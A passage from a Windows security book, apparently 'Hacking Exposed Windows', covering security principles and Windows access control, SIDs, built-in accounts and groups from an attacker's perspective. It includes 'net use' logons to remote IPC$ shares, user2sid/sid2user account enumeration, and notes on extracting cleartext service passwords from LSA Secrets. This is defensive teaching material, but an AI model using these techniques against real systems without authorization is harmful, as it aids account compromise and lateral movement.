logical , network  ingress egress control, security monitoring and response, and security account group  management. We will touch on best practices throughout all of these areas in this book. Finally, and perhaps most importantly, some part of the security organization needs  to adopt a proactive, forward-looking view. The work of a security architect is particularly  relevant to application development, which must follow strict standards and guidelines  to  avoid  perpetuating  the  many  mistakes  that  unavoidably  occur  in  the  software  development process. In addition, this role can perform regular evaluations of physical,  network,  and  platform  security  architecture,  benchmarking  them  against  evolving  standards and technologies to ensure that the organization is keeping pace with the most  recent security advancements.  Detect  A policy document is great, but what good is a policy if you can’t figure out whether  anyone is following it? Much of the material in this book focuses on the Detect part of the  security wheel, since finding and identifying security vulnerabilities is a critical part of    Chapter 1:   Information Security Basics   9  detecting violations of security policy. Other processes that fall into the Detect sphere  include the following:     Automated vulnerability scanning    Security event and information management  SEIM     Intrusion detection systems  IDS     Anomaly detection systems  ADS     Security audits  including penetration testing   This is not a book on the art of intrusion detection or forensic analysis, but we do  make  several  recommendations  for  Windows  configuration  settings  throughout  this  book that will enable a strong detective controls regime. Don’t forget to review the logs  you keep in a timely fashion—there’s no point in keeping them, otherwise.  Respond  Continuing around the security wheel, we arrive at Respond. Assuming that a security  vulnerability—or,  egads,  an  actual  breach—is  identified  in  the  Detect  phase,  the  next  step  is  to  analyze  and  act   possibly  quite  quickly! .  Some  of  the  key  elements  of  the  Respond portion of the security lifecycle include the following:     Incident response  IR     Remediation    Audit resolution    Recovery  We’ll talk in detail about vulnerability remediation, resolution, and recovery in the  course of describing how to avoid getting hacked. We will not spend much time discussing  what to do in case you do get successfully attacked, however, which is the discipline of  security  incident  response   IR .  IR  describes  many  critical  procedures  that  should  be  followed  immediately  after  a  security  incident  occurs  to  stem  the  damage,  and  these  procedures  should  be  in  place  in  advance.  We  also  do  not  cover  business  continuity  planning  and  disaster  recovery   BCP DR   issues  in  this  book.  We  have  listed  some  recommended references on these topics in the “References and Further Reading” section  at the end of this chapter.  Rinse and Repeat  Before  we  close  our  brief  discussion  of  the  Plan,  Prevent,  Detect,  Respond  security  framework,  we’ll  again  highlight  the  cyclic  nature  of  the  model.  Regular  analyses  of  information  gathered  during  the  Detect  phase  and  from  post-mortems  of  Response  activities should be gathered and collated, and relevant learning should then be driven  back  into  the  next  turn  through  the  security  lifecycle,  beginning  with  Plan.  Any  organization that doesn’t learn from history is doomed to repeat it, and thus it is most    10   Hacking Exposed Windows: Windows Security Secrets & Solutions   critical to invest in this aspect of the security lifecycle. It’s also a great idea to involve key  business stakeholders in this process, since strategic business initiatives are likely to have  a  large  impact  on  where  investments  in  information  security  should  be  made  in  the  upcoming budget.  For the remainder of this chapter, we outline some basic security principles on which   to base your policy or to consider while you page through the rest of this book.  BASIC SECURITY PRINCIPLES  We’ve  assembled  the  following  principles  during  our  combined  years  of  security  assessment consulting against all varieties of networks, systems, and technologies. We  do not claim to have originated any of these; they are derived from our observation and  discussion of security at large organizations as well as statements of others that we’ve  collected over the years. Some of these principles overlap with specific recommendations  we make in this book, but some do not. In fact, we may violate some of these principles  occasionally to illustrate the consequences of bad behavior—so do as we say, not as we  do! Remember that security is not a purely technical solution, but rather a combination  of technical measures and processes that are uniquely tailored to your environment. In  his online newsletter, security expert Bruce Schneier perhaps stated this most eloquently:  “Security is a process, not a product.”  Hold Everyone Accountable for Security Let’s face it, the number of thoughtful security experts in the world is not going to scale  to  cover  all  of  the  activities  that  occur  on  a  daily  basis.  Distribute  accountability  for  security across your organization so that it is manageable. We love the following tagline  borrowed from the security group at a large biotechnology firm: “People are the ultimate  intrusion detection system.”  Block or Disable Everything that Is Not Explicitly Allowed We will repeat this mantra time and again in this book. With some very obscure exceptions,  no known methods exist for attacking a system remotely with no running services. Thus,  if you block access to or disable services outright, you cannot be attacked.  This is small consolation for those services that are permitted, of course—for example,  application services such as Internet Information Services  IIS  that are necessary to run  a web application. If you need to allow access to a service, make sure you have secured  it according to best practices.  Since they are most always unique, applications themselves must be secured with  good ol’ fashioned design and implementation best practices, such as Microsoft’s Security  Development Lifecycle  SDL  framework.  See “References and Further Reading.”    Chapter 1:   Information Security Basics   11  Always Set a Password, Make It Reasonably Complex,  and Change It Often Passwords are the bane of the security world—they are the primary form of authentication  for just about every product in existence, Windows included. Weak passwords are the  primary way in which we defeat Windows networks in professional penetration testing  engagements. Always set a password  never leave it blank , and make sure it’s not easily  guessed.  See Chapter 5 for some Windows-specific tips.  Use multifactor authentication  if feasible.  Modern versions of Windows are fairly easy to integrate with smart cards, for  example.   Keep Up with Vendor Patches—Religiously Anybody who has worked in software development knows that accidents happen. When  a bug is discovered in a Microsoft product, however, the rush to gain fame and popularity  typically  results  in  a  published  exploit  within  mere  hours.  This  means  you  have  a  continually shrinking window of time to apply patches from Microsoft before someone  comes knocking on your door trying to exploit the hole. As you will see from the severity  of some of these issues described in this book, the price of not keeping up with patches  is complete and utter remote system compromise.  Authorize All Access Using Least Privilege This concept is the one most infrequently grasped by our consulting clientele, but it’s the  one that we exploit to the greatest effect on their networks. Authorization  which occurs  after authentication, or login  is the last major mechanism that protects sensitive resources  from access by underprivileged users. Guessing a weak password is bad enough, but  things get a lot worse when we discover that the lowly user account we just compromised  can mount a share containing sensitive corporate financial data. Yes, it requires a lot of  elbow grease to inventory all the resources in your IT environment and assign appropriate  access  control,  but  if  you  don’t  do  it,  you  will  only  be  as  strong  as  your  weakest  authentication link—back to that one user with the lame password.  The modern  post–16 bit  Windows authorization architecture isn’t your best friend  in this department. It is primarily centered around access control lists  ACLs  applied  across millions of individual objects within the operating system  from files, to Registry  keys, to programmatic structures such as named pipes , the net intersection of which is  poorly understood even by Microsoft itself  or so it seems sometimes . We will discuss  relevant tactical ACL settings throughout this book, but we forewarn you that creating a  comprehensive, heterogeneous, distributed authorization policy using Windows today  can be daunting. Keep it simple in design, and stick to time-honored principles  such as  role-based access control, or RBAC .   12   Hacking Exposed Windows: Windows Security Secrets & Solutions   Limit Trust No system is an island, especially with Windows. One of the most effective attacks we  use against Windows networks is the exploitation of an unimportant domain member  computer with a weak local administrator password. Then, by using techniques discussed  in  Chapter  6,  we  extract  the  credentials  for  a  valid  domain  user  from  this  computer,  which  allows  us  to  gain  a  foothold  on  the  entire  domain  infrastructure  and  possibly  domains that trust the current one. Recognize that every trust relationship you set up,  whether it be a formal Windows domain trust or simply a password stored in a batch file  on a remote computer, expands the security periphery and increases your risks.  A corollary of this rule is that password reuse should be explicitly banned. We can’t  count  the  number  of  times  we’ve  knocked  over  a  single  Windows  system,  cracked  passwords for a handful of accounts, and discovered that these credentials enabled us to  access  just  about  every  other  system  on  the  network   phone  system  switches,  UNIX  database servers, mainframe terminals, web applications—you name it .  Be Particularly Paranoid with External Interfaces The total number of potential vulnerabilities on a network can seem staggering, but you  must learn to focus on those that present the most risk. These are often related to systems  that face public networks, such as web servers and so on. Front-facing systems  as we’ll call  them  should be held to a higher standard of accountability than internal systems, because  the risks that they face are greater. Remember that the public-switched telephone network  is  a  front-facing  interface  as  well.   See  Hacking  Exposed,  Fifth  Edition,  Chapter  6,  for  recommendations on dial-up and VoIP security, which we will not treat in this book.   Practice Defense in Depth Overall  security  should  not  be  reliant  upon  a  single  defense  mechanism.  If  an  outer  security  perimeter  is  penetrated,  underlying  layers  should  be  available  to  resist  the  attack.  The  corollary  to  this  principle  is  compartmentalization—if  one  compartment  is  compromised,  it  should  be  equally  difficult  for  an  intruder  to  obtain  access  to  each  subsequent compartment.  Fail Secure When a system’s confidentiality, integrity, availability, or accountability is compromised,  the system should fail to a secure state  that is, it should become nonfunctional .  Practice Defense Through Simplicity A simple system is more easily secured than a complex system, as simplicity means a  reduced chance for errors or flaws. A corollary of this principle is the concept of dedicated function  or  modularity:  systems  or  components  of  systems  should  be  single-purposed  to  avoid  potential  conflicts  or  redundancies  that  could  result  in  security  exposures.    Chapter 1:   Information Security Basics   13  Be prepared to defend this principle against the potential costs of maintaining single- purposed systems.  One classic argument we’ve had over the years is whether it’s wise  to install Windows IIS and SQL Server on the same machine; we’ll leave the resolution of  this discussion as an exercise for the reader.   There Is No Perfect Solution—Risk Management Is the Key Don’t  let  paranoia  disrupt  business  goals   and  vice  versa .  Many  of  the  specific  recommendations we make in this book are fairly restrictive. That’s our nature—we’ve  seen  the  damage  less  restrictive  policies  can  do.  However,  these  are  still  just  recommendations.  We  recognize  the  technical  and  political  realities  you  will  face  in  attempting to implement these recommendations. The goal of this book is to arm you  with  the  right  information  to  make  a  persuasive  case  for  the  more  restrictive  stance,  knowing that you may not win all the arguments. Pick your battles, and win the ones  that matter.  Realize that Technology Will Not Protect You from Social Attacks This book is targeted mainly at technology-driven attacks—software exploits that require  a  computer  and  technical  skills  to  implement.  However,  some  of  the  most  damaging  attacks  we  have  seen  and  heard  of  do  not  involve  technology  at  all.  So-called  social engineering uses human-to-human trickery and misdirection to gain unauthorized access  to data. The information in this book can protect you only at the level of bits and bytes— it will not protect you from social attacks that circumvent those bits and bytes entirely.  Educate  yourself  about  common  social  engineering  tactics  like  phishing   see  Hacking Exposed,  Fifth  Edition,  Chapter  13 ,  and  educate  your  organization  through  good  communication and training.  Learn Your Platforms and Applications Better than the Enemy This book is designed to convey a holistic view of Windows security, not just a “script- kiddie” checklist of configuration settings that will render you bulletproof. We hope that  by the end of the book you will have a greater appreciation of the Windows security  architecture, where it breaks down, and best practices to mitigate the risk when it does.  We also hope these practices will prove timeless and will prepare you for whatever is  coming  down  the  pike  in  the  next  version  of  Windows,  as  well  as  from  the  hacking  community.  SUMMARY  By  following  the  best  practices  outlined  in  this  chapter,  you  will  have  laid  a  solid  foundation  for  information  system  security  in  your  organization.  For  the  rest  of  this  book, we will move on to the specifics of Windows and the unique challenges it presents  to those who wish to keep it secure.   14   Hacking Exposed Windows: Windows Security Secrets & Solutions   Location www.securityfocus.com www.cert.org octave   REFERENCES AND FURTHER READING Reference Bugtraq Operationally Critical Threat,  Asset, and Vulnerability Evaluation   OCTAVE  Threat modeling resources from  Microsoft Attack trees Security Development Lifecycle   SDL  Microsoft’s DREAD rating system  http:  msdn2.microsoft.com en-us security  aa570411.aspx www.schneier.com paper-attacktrees-ddj-ft.html www.microsoft.com mspress books 8753.aspx  http:  msdn2.microsoft.com en-gb library  aa302419.aspx www.ﬁ rst.org cvss   www.17799.com  http:  en.wikipedia.org wiki ISO_27001 www.itgi.org   www.coso.org   www.best-management-practice.com IT-Service- Management-ITIL  www.microsoft.com technet technetmag  issues 2006 09 BusinessofIT default.aspx www.pcisecuritystandards.org   www.informationshield.com ispmemain.htm   www.rfc-editor.org  by Kevin Mandia, Chris Prosise, and Matt Pepe.

This  chapter is designed to lay just such a foundation. It is targeted mainly at those who  may not be intimately familiar with some of the basic security functionality of Windows,  so you old pros in the audience are advised to skip this discussion and dig right into the  meat of Chapter 3.  This is not intended to be an exhaustive, in-depth discussion of the Windows security  architecture. Several good references for this topic can be found in the section “References  and Further Reading” at the end of the chapter. In addition, we strongly recommend that  you read Chapter 12 for a detailed discussion of specific security features in Windows  that can be used to counteract many of the attacks discussed throughout this book.  Our focus in this chapter is to give you just enough information to enable you to   understand the primary goal of Windows attackers:  To execute commands in the most privileged context, in order to gain access to resources  and data.  Let’s  start  by  introducing  some  of  the  critical  concepts  necessary  to  flesh  out  this  statement.  Unless  otherwise  specified,  all  references  to  Windows  in  this  chapter  refer  to  Microsoft’s  Windows NT family of operating systems, including Windows Server 2008, Vista, Server 2003, XP,  2000, and NT.  OVERVIEW  It’s difficult to describe something as complex as Windows in a few short paragraphs,  and  we’re  not  even  going  to  try  here.  Instead,  we’re  going  to  provide  a  somewhat  oversimplified description of the Windows security architecture, paying close attention  to points that have been attacked in the past.  Perhaps the most obvious initial observation to make about the Windows architecture  is that it is two-tiered. The most privileged tier of operating system code runs in so-called  kernel  mode  and  has  effectively  unrestricted  access  to  system  resources.  User  mode functionality has much more restricted access and must request services from the kernel  in  many  instances  to  complete  certain  tasks,  such  as  accessing  hardware  resources,  authenticating users, and modifying the system.  Based on this simple separation, we can contemplate two basic attack methodologies:  attack  the  kernel,  or  attack  user  mode.  These  two  basic  approaches  are  illustrated  in  Figure 2-1, which shows a malicious hacker accessing the kernel via physical device  media interface, and also attacking a user mode security context by compromising the  credentials of a valid system user.  Note that the attacker may then also compromise the  kernel  if  he  or  she  hacks  an  administrative  user  context.   Let’s  explore  both  of  these  approaches in more detail.   Chapter 2:  The Windows Security Architecture from the Hacker’s Perspective   17  Figure 2-1  Attacking Windows security using both kernel and user mode approaches  Attacking the Kernel  The  kernel  mode  interface  is  an  obviously  attractive  boundary  that  attackers  have  historically  sought  to  cross.  If  someone  can  insert  code  of  their  choosing  into  kernel  mode, the system is utterly compromised  as you will see in Chapters 6 and 8 . As you  might  imagine,  Windows  provides  substantial  barriers  to  running  arbitrary  code  in  kernel mode, and it is generally quite difficult for low-privileged entities to do so.  Of  course,  there  are  always  exceptions.  Two  primary  classes  of  kernel  mode   compromises can occur:    Physical attacks against kernel-resident device drivers that parse raw input,   such as from network connections or inserted media. The wireless networking  attacks published by Johnny Cache and others and the Sony CD-ROM rootkit  incident are examples of each of these, respectively  see “References and  Further Reading” .   18   Hacking Exposed Windows: Windows Security Secrets & Solutions     Logical attacks against critical operating system structures that provide access to  kernel mode. These structures include certain protected kernel images  such as  ntoskrnl.exe, hal.dll, and ndis.sys , the Global Descriptor Table  GDT  and the  Interrupt Descriptor Table  IDT , the System Service Descriptor Table  SSDT ,  certain critical processor–model-speciﬁ c registers  MSRs , and some internal  routines that are used for debugging purposes by the kernel.  Starting with Vista 64-bit versions, Microsoft implemented a protection system called PatchGuard to  attempt to protect each of these logical kernel entry points. See this chapter’s “References and Further  Reading” section for published methods to bypass PatchGuard. Microsoft also implemented mandatory  kernel driver signing and hardware Data Execution Prevention  DEP  in 64-bit versions.  Attacks against the kernel typically require great sophistication and are not common.  Of course, once an attack is conceived and implemented, prepackaged exploits written  by sophisticated attackers and distributed widely via the Internet can raise the prevalence of  such  attacks  significantly.  Another  mitigating  factor  is  that  the  “logical”  flavor  of  kernel attacks typically requires substantial user privileges on the system. Which brings  us to our second attack methodology, and the one on which we will spend most of our  time in this book.  Attacking User Mode  As illustrated in Figure 2-1, attacking the kernel is equivalent to attacking the walls of the  Windows  castle.  Most  attacks  against  the  operating  system  have  historically  taken  a  more obvious and potentially easier route, via the doors and windows.  User mode code serves effectively as the door and window into resources and data  on the system. Obviously, this code must be able to access resources and data, or the  operating system would offer a pretty poor user experience. Thus, if you can authenticate  to Windows as an authorized user, you will have access to all the resources and data  relevant  to  that  user.  Furthermore,  if  you  are  lucky  enough  to  authenticate  as  an  administrative user, you will likely have access to the resources and data for all the users  on the system. The access control gatekeeper for user mode data and resources is the  Local Security Authority  LSA , a protected subsystem that works across user and kernel  mode to authenticate users, authorize access to resources, enforce security policy, and  manage security audit events.  The LSA is implemented in a process called the Local Security Authority Subsystem Service, or  lsass.exe.  Assuming compromise via the kernel has been avoided, the LSA subsystem is the  primary security gateway into Windows. The rest of this chapter will focus on how it  validates access to objects, checks user privileges, and generates audit messages. Unless  otherwise noted, all discussion will assume user mode scenarios.   Chapter 2:  The Windows Security Architecture from the Hacker’s Perspective   19  ACCESS CONTROL OVERVIEW  The security subsystem is the primary gatekeeper through which subjects access objects within  the  Windows  operating  system.  We  use  the  terms  subjects  generically  here  to  describe any entity that performs some action, and objects to mean the recipient of that  action. In Windows, subjects are processes  associated with access tokens , and objects are  securable objects  associated with security descriptors .  Processes are the worker bees of computing. They perform all useful work  together  with subprocess constructs called threads . Securable objects are the things that get acted  upon.  Within  Windows  are  many  types  of  securable  objects:  files,  directories,  named  pipes, services, Registry keys, printers, networks shares, and so on.  When a user logs on to Windows  that is, authenticates , the operating system creates  an access token containing security identifiers  SIDs  correlated with the user’s account  and any group accounts to which the user belongs. The token also contains a list of the  privileges held by the user or the user’s groups. We’ll talk in more detail about SIDs and  privileges later in this chapter. The access token is associated with every process created  by the user on the system.  When a securable object is created, a security descriptor is assigned that contains a  discretionary access control list  DACL, sometimes generalized as ACL  that identifies which  user and group SIDs may access the object, and how  read, write, execute, and so on .  To  perform  access  control,  the  Windows  security  subsystem  simply  compares  the  SIDs in the subject’s token to the SIDs in the object’s ACL. If a match is found, access is  permitted; otherwise, it is denied.  The remainder of this chapter will take a more detailed look at subjects, since they are  the only way to access objects  absent kernel-mode control, again . For further information  on securable objects, see “References and Further Reading.”  SECURITY PRINCIPALS  As we noted earlier, the fundamental subject within Windows is the process. We also  noted that processes must be associated with a user account in order to access securable  objects. This section will explore the various account types in Windows, since they are  the foundation for most attacks against access control.  Windows offers three types of fundamental accounts, called security principals:     Users    Groups    Computers  We’ll  discuss  each  of  these  in  more  detail  shortly,  just  after  we  take  a  brief  detour  to  discuss SIDs.  With the advent of service-specific SIDs in Vista  see “Service Hardening” in Chapter 12 , you might  say  that  services  could  now  also  be  considered  principals,  although  Microsoft  has  not  formally  changed its terminology.   Hacking Exposed Windows: Windows Security Secrets & Solutions   20   SIDs  In Windows, security principals generally have friendly names, such as Administrator or  Domain Admins. However, the NT family manipulates these objects internally using a  globally unique 48-bit number called a security identifier, or SID. This prevents the system  from confusing the local Administrator account from Computer A with the identically  named local Administrator account from Computer B, for example.  The SID comprises several parts. Let’s take a look at a sample SID:  S-1-5-21-1527495281-1310999511-3141325392-500  A SID is prefixed with an S, and its various components are separated with hyphens.  The first value  in this example, 1  is the revision number, and the second is the identifier  authority value. Then four subauthority values  21 and the three long strings of numbers,  in this example  and a relative identifier  RID—in this example, 500  make up the remainder  of the SID.  SIDs may appear complicated, but the important concept for you to understand is that  one part of the SID is unique to the installation or domain and another part is shared across  all installations and domains  the RID . When Windows is installed, the local computer  generates a random SID. Similarly, when a Windows domain is created, it is assigned a  unique SID  we’ll define domains later in this chapter . Thus, for any Windows computer or  domain, the subauthority values will always be unique  unless purposely tampered with  or duplicated, as in the case of some low-level disk-duplication techniques .  However, the RID is a consistent value across all computers or domains. For example,  a SID with RID 500 is always the true Administrator account on a local machine. RID 501  is the Guest account. On a domain, RIDs starting with 1001 indicate user accounts.  For  example, RID 1015 would be the fifteenth user account created in the domain.  Suffice to  say that renaming an account’s friendly name does nothing to its SID, so the account can  always be identified, no matter what. Renaming the true Administrator account changes  only the friendly name—the account is always identified by Windows  or a malicious  hacker with appropriate tools  as the account with RID 500.  Why You Can’t Log on as Administrator Everywhere As is obvious by now  we hope , the Administrator account on one computer is different  from  the  Administrator  account  on  another  because  they  have  different  SIDs,  and  Windows can tell them apart, even if humans can’t. This feature can cause headaches for  the uninformed hacker.  Occasionally  in  this  book,  we  will  encounter  situations  where  logging  on  as   Administrator fails. Here’s an example: C:\>net use \\192.168.234.44\ipc$ password  u:Administrator System error 1326 has occurred.  Logon failure: unknown user name or bad password.   Chapter 2:  The Windows Security Architecture from the Hacker’s Perspective   21  A hacker might be tempted to turn away at this point, without recalling that Windows  automatically passes the currently logged-on user’s credentials during network logon  attempts. Thus, if the user were currently logged on as Administrator on the client, this  logon attempt would be interpreted as an attempt to log on to the remote system using  the local Administrator account from the client. Of course, this account has no context on  the remote server. You can manually specify the logon context using the same net use command  with  the  remote  domain,  computer  name,  or  IP  address  prepended  to  the  username with a backslash, like so: C:\>net use \\192.168.234.44\ipc$ password  u:domain\Administrator The command completed successfully.  Obviously,  you  should  prepend  the  remote  computer  name  or  IP  address  if  the  system to which you are connecting is not a member of a domain. Remembering this  little trick will come in handy when we discuss remote shells in Chapter 7; the technique  we use to spawn such remote shells often results in a shell running in the context of the  SYSTEM account. Executing net use commands within the LocalSystem context cannot  be interpreted by remote servers, so you almost always have to specify the domain or  computer name, as shown in the previous example. Viewing SIDs with user2sid sid2user You can use the user2sid tool from Evgenii Rudnyi to extract SIDs. Here is user2sid being  run against the local machine: C:\>user2sid \\caesars Administrator S-1-5-21-1507001333-1204550764-1011284298-500  Number of subauthorities is 5 Domain is CORP Length of SID in memory is 28 bytes Type of SID is SidTypeUser  The sid2user tool performs the reverse operation, extracting a username given a SID.   Here’s an example using the SID extracted in the previous example: C:\>sid2user \\caesars 5 21 1507001333 1204550764 1011284298-500 Name is Administrator Domain is CORP Type of SID is SidTypeUser  Note that the SID must be entered starting at the identifier authority number  which is  always 5 in the case of Windows Server 2003 , and spaces are used to separate components,  rather than hyphens.   22   Hacking Exposed Windows: Windows Security Secrets & Solutions   Users  As we will discuss in Chapter 4, this information can be extracted over an unauthenticated session  from a Windows system running SMB services in certain legacy configurations.  Anyone with even a passing familiarity with Windows has encountered the concept of  user accounts. We use accounts to log on to the system and to access resources on the  system  and  the  network.  Few  have  considered  what  an  account  really  represents,  however, which is one of the most common security failings on most networks.  Quite simply, an account is a reference context in which the operating system executes  code. Put another way, all user mode code executes in the context of a user account. Even some  code that runs automatically before anyone logs on  such as services  runs in the context  of an account  often as the special and all-powerful SYSTEM, or LocalSystem, account . All commands invoked by the user who successfully authenticates using the account  credentials  are  run  with  the  privileges  of  that  user.  Thus,  the  actions  performed  by  executing code are limited only by the privileges granted to the account that executes it.  The goal of the malicious hacker is to run code with the highest possible privileges. Thus,  the hacker must “become” the account with the highest possible privileges.  Users—physical  human  beings—are  distinct  from  user  accounts—digital  manifestations  that  are  easily spoofed given knowledge of the proper credentials. Although we may unintentionally blur the  distinction in this book, keep this in mind.  Built-ins Windows comes out of the box with built-in accounts that have predefined privileges.  These  default  accounts  include  the  local  Administrator  account,  which  is  the  most  powerful user account in Windows.  Actually, the SYSTEM account is technically the  most  privileged,  but Administrator  can  execute  commands  as  SYSTEM  quite  readily  using the Scheduler Service to launch a command shell, for example.  Table 2-1 lists the  default built-in accounts on various versions of Windows.  Note a few caveats about Table 2-1:     On domain controllers, some security principals are not visible in the default   Active Directory Users and Computers interface unless you choose View   Advanced Features.     Versions of Windows including XP and later “hide” the local Administrator   account by default, but it’s still there.     Some of the accounts listed in Table 2-1 are not created unless speciﬁ c server   roles have been conﬁ gured; for example, Application Server  IIS .     The group Guests, the user accounts Guest, and Support_388945a0 are assigned   unique SIDs corresponding to the domains in which they reside.

Service accounts are typically not used by human beings for interactive logon,  but are used to start up and run automated routines that provide certain functionality to  the operating system on a continuous basis. For example, the Indexing service, which  indexes contents and properties of files on local and remote computers, and is located in  %systemroot%\System32\cisvc.exe, can be configured to start up at boot time using the  Services control panel. For this executable to run, it must authenticate to the operating  system. For example, the Indexing service authenticates and runs as the LocalSystem  account on Windows Server 2003 in its out-of-the-box configuration.  The advent of service-specific SIDs in Vista permits the Service Control Manager  SCM  to assign  SIDs to service processes when they start, which improves the granularity of access control over the  simple account-based model  although accounts are still used .   24   Hacking Exposed Windows: Windows Security Secrets & Solutions   Service accounts are a necessary evil in Windows. Because all code must execute in  the  context  of  an  account,  they  can’t  be  avoided.  Unfortunately,  because  they  are  designed  to  authenticate  in  an  automated  fashion,  the  passwords  for  these  accounts  must be provided to the system without human interaction. In fact, Microsoft designed  the Windows NT family to cache passwords for service accounts on the local system.  This was done for the simple convenience that many services need to start up before the  network  is  available   at  boot  time ,  and  thus  could  not  be  authenticated  to  domain  controllers.  By  caching  the  passwords  locally,  this  situation  is  avoided.  Here’s  the  kicker:  Non-SYSTEM service account passwords are stored in cleartext in a portion of the Registry  called the LSA Secrets, which is accessible only to LocalSystem.  We highlighted this sentence because it leads to one of the major security failings of the  Windows OS: If a malicious hacker can compromise a Windows NT family system with  Administrator-equivalent privileges, he or she can extract the cleartext passwords for  service accounts on that machine.  “Yippee,” you might be saying, if you’re already Administrator-equivalent on the  machine;  “What  additional  use  are  the  service  accounts?”  Here’s  where  things  get  sticky: Service accounts can be domain accounts or even accounts from other trusted  domains.  See the section “Trusts” later in this chapter.  Thus, credentials from other  security domains can be exposed via this flaw. You’ll read more about how this is done  in Chapter 7.  We strongly recommend that all service accounts be denied interactive logon rights using machine or  domain policy to prevent such credentials from being used interactively by a human intruder.  Service Hardening  Services represent a large percentage of the overall attack surface in  Windows because they are generally always on and run at high privilege. Largely because  of this, Microsoft began taking steps to reduce the risk from running services in more  recent versions of the OS.  One of the first steps was to run services with least privilege, a long-accepted access  control principle. Beginning in Windows Server 2003, Microsoft created two new built-in  groups  called  Local  Service  and  Network  Service,  and  started  running  more  services  using those lower privileged accounts rather than the all-powerful LocalSystem account.   We’ll talk more about Local and Network Service throughout this chapter.   In Vista, Microsoft implemented Windows Service Hardening, which defined per- service SIDs. This effectively made certain services behave like unique users  again, as  opposed to the generic and highly privileged LocalSystem identity . Default Windows  access control settings could now be applied to resources in order to make them private  to  the  service,  preventing  other  services  and  users  from  accessing  the  resource.    Chapter 2:  The Windows Security Architecture from the Hacker’s Perspective   25  Groups  Additional  features  included  within  Service  Hardening  in  Vista  include  removal  of  unnecessary Windows privileges  such as the powerful debugging privilege , applying  a write-restricted access token to the service process to prevent writing to resources  that do not explicitly grant access to the Service SID, and linking Windows firewall  policy to the per-service SID to prevent unauthorized network access by the service.  For  more  information  about  Service  Hardening,  see  “References  and  Further  Reading.”  The Bottom Line Here’s a summary of Windows accounts from the malicious hacker’s perspective:  Administrators and the SYSTEM account are the juiciest targets on a Windows system  because they are the most powerful accounts. All other accounts have limited privileges  relative to Administrators and SYSTEM  one possible exception being service accounts .  Compromise of Administrators or the SYSTEM account is thus almost always the  ultimate goal of an attacker.  Groups  are  primarily  an  administrative  convenience—they  are  logical  containers  for  aggregating user accounts.  They can also be used to set up e-mail distribution lists in  Windows 2000 and later, which historically have had no security implications.   Groups are also used to allocate privileges in bulk, which can have a heavy impact on  the  security  of  a  system.  Windows  in  its  various  flavors  comes  with  built-in  groups,  predefined containers for users that also possess varying levels of privilege. Any account  placed  within  a  group  inherits  those  privileges.  The  simplest  example  of  this  is  the  addition of accounts to the local Administrators group, which essentially promotes the  added user to all-powerful status on the local machine.  You’ll see this attempted many  times  throughout  this  book.   Table  2-2  lists  built-in  groups  in  Windows  Server  2003.  Other versions of Windows may have fewer or different built-in groups, but those listed  in Table 2-2 are the most common.  An organizational unit  OU  can be used in addition to groups to aggregate user accounts. OUs are  arbitrarily defined Active Directory constructs and don’t possess any inherent privileges like security  group built-ins.  When a Windows Server system is promoted to a domain controller, a series of predefined  groups are installed as well. The most powerful predefined groups include the Domain  Admins,  who  are  all-powerful  on  a  domain,  and  the  Enterprise Admins,  who  are  all- powerful throughout a forest. Table 2-3 lists the Windows Server 2003 predefined groups.   26   Hacking Exposed Windows: Windows Security Secrets & Solutions   Group Name Account Operators Administrators  Backup Operators Guests HelpServicesGroup  IIS_WPG  Local Service  Network Conﬁ guration  Operators Network Service  Performance Log Users  Performance Monitor  Users Power Users  Print Operators Remote Desktop Users  Replicator Server Operators TelnetClients  Terminal Server License  Servers Users  Comment Not quite as powerful as Administrators, but close Members are all-powerful on the local machine  SID S-1- 5-32-544  Not quite as powerful as Administrators, but close Same privileges as Users New to Windows Server 2003; used for Help and Support  Center New in Windows Server 2003; if IIS is installed, this is the  IIS Worker Process Group that runs application processes New in Windows Server 2003, this is a lesser-privileged  hidden group designed for service accounts that don’t  need network access  instead of using SYSTEM  New in Windows Server 2003, this group has  enough privileges to manage network conﬁ guration New in Windows Server 2003, this is a lesser-privileged  hidden group designed for service accounts requiring  network access  instead of using SYSTEM  New in Windows Server 2003, this group has remote  access to schedule logging of performance counters New in Windows Server 2003, this group has remote  access to monitor the computer More powerful than Users, but not as powerful as  Administrators Not quite as powerful as Administrators, but close New in Windows Server 2003, this is equivalent to  Terminal Server users in prior versions Used for ﬁ le replication in a domain Not quite as powerful as Administrators, but close New in Windows Server 2003, members can access telnet  services if enabled New to Windows Server 2003, these machines can issue  TermServ licenses All user accounts on the local machine; a low-privilege  group  SID S-1-5-32-545   Table 2-2  Examples of Built-in Groups in Windows Server 2003   Chapter 2:  The Windows Security Architecture from the Hacker’s Perspective   27  Group Name Cert Publishers  DnsAdmins  DnsAdmins DnsUpdateProxy  Domain Admins Domain Users Domain Computers Domain Controllers Domain Guests Enterprise Admins Group Policy Creator Owners  Incoming Forest Trust Builders  Pre-Windows 2000 Compatible  Access RAS and IAS Servers  Schema Admins  Windows Authorization Access  Group  Comment Members are permitted to publish  certiﬁ cates to the Active Directory DNS administrators  only if Windows  DNS is installed  DNS administrators, domain local DNS clients who are permitted to  perform dynamic updates on behalf  of some other clients  such as DHCP  servers; only if Windows DNS is  installed  All-powerful on the domain All domain users All computers in the domain All domain controllers in the domain All domain guests All-powerful in the forest Members can modify group policy for  the domain Members can create incoming, one-way  trusts to this forest Backward compatibility group  Servers can access “remote access”  properties on user objects Members can edit the directory schema;  very powerful Members have access to the computed  tokenGroupsGlobalAndUniversal  attribute on User objects  Table 2-3  Predeﬁ ned Groups in Windows Server 2003   28   Hacking Exposed Windows: Windows Security Secrets & Solutions   To summarize Windows groups from the malicious hacker’s perspective: Members of the local Administrators group are the juiciest targets on a Windows system  because members of this group inherit complete control of the local system. Domain  Admins and Enterprise Admins are the juiciest targets on a Windows domain because  members of those groups are all-powerful on every  properly conﬁ gured  machine in  the domain. All other groups possess very limited privileges relative to Administrators,  Domain Admins, or Enterprise Admins. Becoming a local Administrator, Domain Admin,  or Enterprise Admin  whether via directly compromising an existing account or by  adding an already-compromised account to one of those groups  is thus almost always  the ultimate goal of an attacker.  Special Identities In addition to built-in groups, Windows has several special identities  sometimes called  well-known  groups ,  which  are  containers  for  accounts  that  transitively  pass  through  certain states  such as being logged on via the network  or from certain places  such as  interactively at the keyboard . These identities can be used to fine tune access control to  resources. For example, access to certain processes may be reserved for INTERACTIVE  users only  and thus blocked for all users authenticated via the network . These well- known  groups  belong  to  the  NT  AUTHORITY  “domain,”  so  to  refer  to  their  fully  qualified name, you would say NT AUTHORITY\Everyone, for example. Table 2-4 lists  the Windows special identities.  Some key points worth noting about these special identities: The Anonymous Logon group can be leveraged to gain a foothold on a Windows  system without authenticating. Also, the INTERACTIVE identity is required 